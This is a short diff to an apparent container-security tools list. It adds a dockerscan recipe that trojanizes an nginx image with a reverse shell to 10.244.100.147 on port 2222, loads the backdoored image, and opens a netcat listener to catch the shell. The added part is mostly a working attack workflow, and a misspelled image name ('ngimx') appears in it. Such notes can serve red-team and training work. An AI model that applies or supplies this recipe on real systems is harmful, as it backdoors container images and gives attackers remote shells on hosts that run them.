@@ -5,6 +5,18 @@
 
 # Tools
 * [dockerscan](https://github.com/cr0hn/dockerscan) weaponize container images
+```bash
+docker save nginx:latest -o nginx-original
+dockerscan image info nginx-original
+dockerscan image analyze nginx-original
+dockerscan image modify trojanize nginx-original -l 10.244.100.147 -p 2222 -o nginx-trojan
+docker load -i nginx-trojan
+# on remote
+nc -v -k -l 10.244.100.147 2222
+# run 
+docker run ngimx:latest
+# honk :)
+```
 * [syft](https://github.com/anchore/syft) generate software bill of materials of containers
 * [build kit](https://hub.docker.com/r/docker/dockerfile/) cheat sheet
 * [buildah](https://github.com/containers/buildah/tree/master/docs/tutorials)
